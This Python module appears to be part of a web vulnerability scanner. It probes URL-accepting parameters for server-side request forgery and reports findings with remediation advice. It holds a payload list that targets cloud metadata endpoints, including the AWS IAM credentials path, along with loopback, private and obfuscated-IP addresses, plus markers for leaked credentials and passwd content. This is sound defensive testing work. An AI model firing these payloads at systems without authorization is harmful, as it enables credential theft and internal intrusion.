"""
SSRF (Server-Side Request Forgery) probe — detect when the application can
be tricked into making requests to internal resources.

Strategy:
  1. Identify parameters whose names suggest they accept URLs/hosts.
  2. Inject internal/cloud-metadata addresses and inspect responses for
     indicators of internal content.
  3. Check for response differences between internal and impossible targets.

Non-destructive: payloads point at read-only metadata endpoints.
"""

from __future__ import annotations

import re

from ..models import Finding
from .base import BaseProbe, InjectionPoint, inject_query_param
from .discovery import URL_PARAMS


# Indicators that the server fetched internal content on our behalf
_INTERNAL_MARKERS: list[tuple[str, str]] = [
    ("ami-id", "AWS EC2 metadata"),
    ("instance-id", "AWS EC2 metadata"),
    ("meta-data", "Cloud metadata index"),
    ("iam/security-credentials", "AWS IAM credentials"),
    ("computeMetadata", "GCP metadata"),
    ("metadata.google.internal", "GCP metadata"),
    ("169.254.169.254", "Link-local metadata IP"),
    ("root:x:0:0:", "Unix passwd file"),
    ("localhost", "Loopback content"),
    ("<title>Dashboard", "Internal dashboard"),
    ("phpinfo()", "PHP info page"),
]


class SSRFProbe(BaseProbe):
    name = "ssrf"
    cwe = "CWE-918"
    max_requests = 20

    def probe(
        self,
        url: str,
        injection_points: list[InjectionPoint],
        body: str = "",
        headers: dict | None = None,
    ) -> list[Finding]:
        findings: list[Finding] = []

        url_pts = [
            pt for pt in injection_points
            if pt.name.lower() in URL_PARAMS
        ]

        for pt in url_pts:
            if not self._can_request():
                break
            finding = self._test_ssrf(pt)
            if finding:
                findings.append(finding)

        return findings

    def _test_ssrf(self, pt: InjectionPoint) -> Finding | None:
        # Get baseline: inject an impossible domain to see what "failure" looks like
        impossible = "https://this-domain-does-not-exist-dvg.test/404"
        baseline_resp = self._inject(pt, impossible)
        if baseline_resp is None:
            return None
        baseline_len = len(baseline_resp.text)
        baseline_code = baseline_resp.status_code

        for payload, desc in _PAYLOADS:
            if not self._can_request():
                return None

            resp = self._inject(pt, payload)
            if resp is None:
                continue

            body = resp.text[:300_000]
            resp_len = len(resp.text)

            # Check for internal-content markers
            for marker, marker_desc in _INTERNAL_MARKERS:
                if marker.lower() in body.lower():
                    return self._finding(
                        title=f"SSRF via '{pt.name}' — {marker_desc}",
                        severity="Critical",
                        category="Injection",
                        evidence=(
                            f"Payload `{payload}` in parameter '{pt.name}' caused "
                            f"the server to fetch internal content. "
                            f"Marker: \"{marker}\" ({marker_desc})"
                        ),
                        impact=(
                            "An attacker can make the server issue requests to internal "
                            "services, cloud metadata endpoints, or private networks. "
                            "This can expose credentials, internal APIs, and enable "
                            "lateral movement."
                        ),
                        remediation=(
                            "Validate and sanitize URL inputs. Block requests to "
                            "private IP ranges (10.x, 172.16-31.x, 192.168.x, "
                            "169.254.x, 127.x) and cloud metadata IPs. Use an "
                            "allowlist of permitted external hosts."
                        ),
                        url=str(resp.url),
                        confidence="high",
                        proof=f"Payload: {payload}\nMarker found: {marker}",
                        cwe="CWE-918",
                    )

            # Response-length heuristic: if the server returned substantially
            # more content for an internal target vs the impossible baseline,
            # something was fetched.
            if (resp_len > baseline_len + 500
                    and resp.status_code == 200
                    and baseline_code != 200):
                return self._finding(
                    title=f"Possible SSRF via '{pt.name}'",
                    severity="High",
                    category="Injection",
                    evidence=(
                        f"Payload `{payload}` returned {resp_len} bytes vs "
                        f"{baseline_len} bytes for an unreachable domain "
                        f"(status {resp.status_code} vs {baseline_code})."
                    ),
                    impact=(
                        "The server appears to fetch content from the injected URL, "
                        "which may expose internal services."
                    ),
                    remediation=(
                        "Validate URL inputs against an allowlist. Block private "
                        "and link-local IP ranges."
                    ),
                    url=str(resp.url),
                    confidence="medium",
                    proof=(
                        f"Payload: {payload} ({desc})\n"
                        f"Response: {resp_len} bytes (status {resp.status_code})\n"
                        f"Baseline: {baseline_len} bytes (status {baseline_code})"
                    ),
                    cwe="CWE-918",
                )

        return None

    def _inject(self, pt: InjectionPoint, payload: str):
        if pt.method == "POST":
            return self._send("POST", pt.target_url, data={pt.name: payload})
        test_url = inject_query_param(pt.target_url, pt.name, payload)
        return self._send("GET", test_url)


_PAYLOADS: list[tuple[str, str]] = [
    # AWS metadata (IMDSv1)
    ("http://169.254.169.254/latest/meta-data/",              "AWS metadata index"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"),
    # GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/",   "GCP metadata"),
    # Azure metadata
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
    # Loopback
    ("http://127.0.0.1/",                                     "Loopback"),
    ("http://127.0.0.1:80/",                                  "Loopback port 80"),
    ("http://127.0.0.1:8080/",                                "Loopback port 8080"),
    ("http://[::1]/",                                         "IPv6 loopback"),
    # Internal ranges
    ("http://10.0.0.1/",                                      "Private 10.x"),
    ("http://192.168.1.1/",                                   "Private 192.168.x"),
    # DNS rebinding / alternative representations
    ("http://0x7f000001/",                                    "Hex loopback"),
    ("http://0177.0.0.1/",                                    "Octal loopback"),
    ("http://2130706433/",                                    "Decimal loopback"),
]
